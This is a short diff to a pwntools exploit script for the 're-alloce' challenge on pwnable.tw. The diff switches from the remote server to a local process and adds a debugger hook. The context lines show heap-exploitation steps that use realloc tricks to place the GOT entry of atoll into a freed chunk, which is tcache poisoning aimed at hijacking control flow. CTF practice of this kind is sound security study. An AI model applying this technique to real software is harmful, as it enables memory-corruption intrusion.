@@ -7,9 +7,9 @@ exe = ELF("./re-alloce")
 libc = ELF("./libc-9bb401974abeef59efcdd0ae35c5fc0ce63d3e7b.so")
 ld = ELF("./ld-2.29.so")
 # context.log_level='debug'
-# context.terminal = ["foot"]
-p = remote("chall.pwnable.tw", 10106)
-# p = process([exe.path])
+context.terminal = ["alacritty", "-e"]
+# p = remote("chall.pwnable.tw", 10106)
+p = process([exe.path])
 def gdbs():
     gdb.attach(p, gdbscript="""
 
@@ -41,6 +41,7 @@ def realloc(idx,size,content):
 add(0,0x10,b"a")
 realloc(0,0,"")
 realloc(0,0x10,p64(exe.got.atoll))
+gdbs()
 add(1,0x10,b"a")
 realloc(1,0x30,"a")
 dels(1)
